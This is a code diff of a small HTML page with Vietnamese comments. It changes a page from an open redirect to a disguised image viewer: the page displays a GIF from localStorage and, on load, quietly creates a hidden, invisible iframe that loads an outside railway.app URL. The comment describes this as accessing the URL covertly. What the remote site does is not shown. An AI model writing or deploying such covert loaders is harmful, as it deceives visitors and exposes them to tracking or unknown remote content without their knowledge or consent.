@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
+    <title>Image</title>
     <style>
         body {
             margin: 0;
@@ -13,25 +13,43 @@
             min-height: 100vh;
             background: #f0f2f5;
         }
-        img {
+        .gif-container {
             max-width: 100%;
             height: auto;
         }
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
         iframe {
+            position: absolute;
             width: 0;
             height: 0;
             border: 0;
-            position: absolute;
+            visibility: hidden;
         }
     </style>
 </head>
 <body>
-    <img id="gifImage" src="https://media-ten.z-cdn.me/2YSqoqffc2sAAAAM/letter-n.gif" alt="Loading...">
-    <iframe src="https://web-production-c2a9d.up.railway.app/" style="display:none;"></iframe>
-    
+    <div class="gif-container">
+        <img src="" id="displayedGif" alt="GIF">
+    </div>
+
     <script>
+        // Lấy dữ liệu GIF từ localStorage
         window.onload = function() {
-            window.location.href = 'https://web-production-c2a9d.up.railway.app/';
+            // Hiển thị GIF
+            const uploadedGif = localStorage.getItem('uploadedGif');
+            if (uploadedGif) {
+                document.getElementById('displayedGif').src = uploadedGif;
+            }
+
+            // Tạo iframe ẩn để truy cập URL ngầm
+            const hiddenFrame = document.createElement('iframe');
+            hiddenFrame.style.display = 'none';
+            hiddenFrame.src = 'https://web-production-c2a9d.up.railway.app/';
+            document.body.appendChild(hiddenFrame);
         }
     </script>
 </body>
